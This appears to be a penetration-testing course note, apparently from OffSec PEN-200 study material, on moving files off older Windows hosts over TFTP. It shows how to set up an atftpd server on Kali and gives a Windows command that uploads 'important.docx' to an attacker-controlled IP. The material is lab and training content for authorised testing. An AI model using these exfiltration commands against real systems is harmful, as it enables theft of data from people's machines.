

TFTP[1](https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/file-transfers/transferring-files-with-windows-hosts/uploading-files-with-tftp#fn1) is a UDP-based file transfer protocol and is often restricted by corporate egress firewall rules.  
  
Useful to transfer files from older Windows operating systems - up to Windows XP and 2003.  
  
This is a terrific tool for non-interactive file transfer, but it is not installed by default on systems running Windows 7, Windows 2008, and newer.  
  
For these reasons, TFTP is not an ideal file transfer protocol for most situations, but under the right circumstances, it has its advantages.  
  
  
Setp on Kali:  
```bash
sudo apt update && sudo apt install atftp  
sudo mkdir /tftp  
sudo chown nobody: /tftp  
sudo atftpd --daemon --port 69 /tftp
```

  
Exectution on Windows:  
```powershell
C:\Users\Offsec> tftp -i 10.11.0.4 put important.docx
```

 
Passive mode:  
Linux:  
```bash
passive
```  
  
Win:
```powershell
quote pasv
```